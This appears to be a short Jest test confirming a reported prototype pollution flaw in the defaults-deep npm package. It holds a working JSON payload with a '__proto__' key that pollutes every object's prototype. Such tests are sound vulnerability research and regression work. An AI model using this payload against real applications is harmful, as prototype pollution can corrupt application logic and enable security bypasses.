//https://hackerone.com/reports/310514
test("prototype pollution in defaults-deep ", () => {
  const defaultsDeep = require("defaults-deep");
  expect({}.polluted).toBe(undefined);

  let malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  defaultsDeep({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe("yes");
});
